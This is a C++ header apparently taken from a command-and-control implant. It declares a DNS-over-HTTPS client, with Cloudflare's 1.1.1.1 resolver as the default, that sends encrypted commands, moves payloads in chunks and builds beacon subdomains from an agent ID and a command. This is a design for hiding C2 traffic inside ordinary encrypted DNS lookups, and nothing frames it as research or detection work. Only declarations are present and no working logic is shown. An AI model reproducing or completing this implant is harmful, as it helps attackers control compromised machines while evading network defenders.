#pragma once
#include <windows.h>
#include <winhttp.h>
#include <vector>
#include <string>
#include <optional>
#include <functional>
#include "../../utils/crypto.hpp"

#pragma comment(lib, "winhttp.lib")

namespace l4g::c2 {

struct DohResponse {
    bool success = false;
    std::vector<uint8_t> data;
    std::string error;
};

class DohClient {
public:
    explicit DohClient(const std::string& endpoint = "https://1.1.1.1/dns-query");
    ~DohClient();
    
    // Send DNS query over HTTPS
    DohResponse query(const std::string& subdomain, const std::string& record_type = "TXT");
    
    // Send encrypted command
    DohResponse send_command(const std::vector<uint8_t>& encrypted_payload);
    
    // Receive response
    DohResponse receive_response();
    
    // Chunked transfer for large payloads
    std::vector<DohResponse> send_chunked(const std::vector<uint8_t>& data, size_t chunk_size = 50);
    std::vector<uint8_t> receive_chunked(const std::vector<std::string>& chunks);
    
    // Generate random subdomain for beacon
    std::string generate_beacon_subdomain(const std::string& agent_id, const std::string& command);
    
private:
    std::string endpoint_;
    HINTERNET session_ = nullptr;
    HINTERNET connection_ = nullptr;
    std::string session_key_;
    
    bool init_session();
    std::string build_dns_query(const std::string& name, const std::string& type);
    DohResponse doh_request(const std::string& dns_query);
    std::vector<uint8_t> parse_dns_response(const std::vector<uint8_t>& response);
};

} // namespace l4g::c2